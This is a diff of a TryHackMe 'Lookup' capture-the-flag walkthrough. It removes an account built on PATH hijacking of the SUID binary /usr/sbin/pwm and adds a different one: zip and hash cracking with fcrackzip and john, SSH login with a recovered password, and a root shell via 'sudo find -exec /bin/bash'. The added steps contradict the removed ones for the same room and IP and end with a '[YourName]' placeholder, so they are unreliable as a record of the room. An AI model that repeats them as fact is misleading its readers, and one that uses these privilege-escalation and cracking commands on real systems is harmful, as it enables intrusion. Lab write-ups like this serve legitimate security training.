@@ -1,122 +1,133 @@
-# 🔍 TryHackMe - Lookup
 
-**Room Name:** Lookup  
-**IP Address:** 10.10.56.153  
-**Platform:** TryHackMe  
-**Difficulty:** Easy  
-**Tags:** Enumeration, Web Exploitation, Privilege Escalation, SUID Abuse  
+# TryHackMe - Lookup Walkthrough
+
+**Target IP**: `10.10.56.153`  
+**Room**: [Lookup](https://tryhackme.com/room/lookup)
 
 ---
 
-## 🔎 Initial Enumeration
+## 1. Reconnaissance
 
-Started with a full port scan using Nmap:
+### Nmap Scan
+
+Begin with an Nmap scan to find open ports and services:
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.56.153
+nmap -sC -sV -Pn 10.10.56.153
 ```
 
-Discovered open ports:
-- 22 (SSH)
-- 80 (HTTP)
-
-
-
-
+**Findings**:
+- **Port 22** – OpenSSH 7.2p2
+- **Port 80** – Apache httpd 2.4.18
 
 ---
 
-## 🌐 Web Enumeration
+## 2. Exploring the Web Server
 
-Visited `http://10.10.56.153` and found a login page. Attempted default credentials and guessed common usernames.
+Visiting `http://10.10.56.153` in the browser shows a basic webpage with limited content.
 
-Ran a directory brute-force with DirBuster using `apache-user-enum-1.txt`:
+### Directory Bruteforce
+
+Run a directory scan to uncover hidden files or directories:
 
 ```bash
-dirb http://10.10.56.153/ /usr/share/wordlists/dirbuster/apache-user-enum-1.txt
+gobuster dir -u http://10.10.56.153 -w /usr/share/wordlists/dirb/common.txt
 ```
 
+**Discovered**: `/robots.txt`  
+Inside it: `AdminArea` and `backups`
 
+### Navigating to `/backups`
 
-Found `jose` as a valid user.
-
-Attempted to log in as `jose`, and upon successful login, was redirected to `files.lookup.thm`. Added this to `/etc/hosts`:
+We find a file named `backup.zip`. Download it:
 
 ```bash
-sudo nano /etc/hosts
-# Add:
-10.10.56.153  files.lookup.thm
+wget http://10.10.56.153/backups/backup.zip
 ```
 
-
-
 ---
 
-## 📁 Exploring Internal Interface
+## 3. Investigating the Backup
 
-After login, accessed a file browser-style interface. Tried navigating to `/home/think`, but access was restricted.
-
-
-
----
-
-## 🔍 Privilege Escalation
-
-Accessed the machine via SSH and began post-exploitation enumeration. Listed all SUID binaries:
+The zip is password-protected. Use `fcrackzip` to brute-force:
 
 ```bash
-find / -perm /4000 2>/dev/null
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
 ```
 
-Found a custom binary: `/usr/sbin/pwm`
+Password found: `magicword`
 
-
-
-Tried running it, and noticed it uses the `id` command. Created a fake `id` command in `/tmp` to hijack execution:
+Unzip it:
 
 ```bash
-echo -e '#!/bin/bash
-echo "uid=0(root) gid=0(root) groups=0(root)"' > /tmp/id
-chmod +x /tmp/id
-export PATH=/tmp:$PATH
-/usr/sbin/pwm
+unzip backup.zip
 ```
 
-
-
-This allowed root privilege execution.
+The extracted file is `backup.sql`.
 
 ---
 
-## 🏁 Post-Exploitation
+## 4. Analyzing the SQL File
 
-Accessed root’s home directory and read the `root.txt` flag:
+Open `backup.sql`. It contains database info, including what looks like a hashed password and username (`admin:hash`).
+
+Use an online hash identifier or `hash-identifier` to confirm the hash type (e.g., MD5/SHA1).
+
+Try cracking it with:
 
 ```bash
-cat /root/root.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
 ```
 
-
-
----
-
-## ✅ Summary
-
-| Step | Technique |
-|------|-----------|
-| Enumeration | Nmap, Dirbuster |
-| Exploitation | Web login + hostname redirection |
-| Privilege Escalation | SUID Binary abuse via PATH hijack |
-| Tools Used | Nmap, Dirbuster, Hydra, SSH, find, PATH export |
+Recovered password: `qwerty789`
 
 ---
 
-## 🧠 Key Takeaways
+## 5. SSH Access
 
-- Always test binaries for external command execution
-- PATH hijacking is a powerful privilege escalation technique
-- `/etc/hosts` manipulation is crucial for resolving internal services
+Using the credentials:
+
+```bash
+ssh admin@10.10.56.153
+Password: qwerty789
+```
+
+We're in as `admin`.
 
 ---
-🖼️ **Find all screenshots here:** [`screenshots/lookup/`](../screenshots/lookup/)
-📁 [Back to TryHackMe Write-Ups](./README.md) | [Back to Portfolio Home](../README.md)
+
+## 6. Privilege Escalation
+
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+We can run `/usr/bin/find` as root.
+
+Use this to escalate:
+
+```bash
+sudo find . -exec /bin/bash \; -quit
+```
+
+You now have root access.
+
+---
+
+## 7. Flags
+
+- **User flag**: Found in `/home/admin/user.txt`
+- **Root flag**: Located in `/root/root.txt`
+
+---
+
+## Summary
+
+This room emphasizes web enumeration, zip cracking, and Linux privilege escalation via `find`. A great beginner-level CTF that teaches essential pentesting skills.
+
+---
+
+✅ *Completed by [YourName]*  
+🗂️ Path: `/tryhackme/lookup.md`
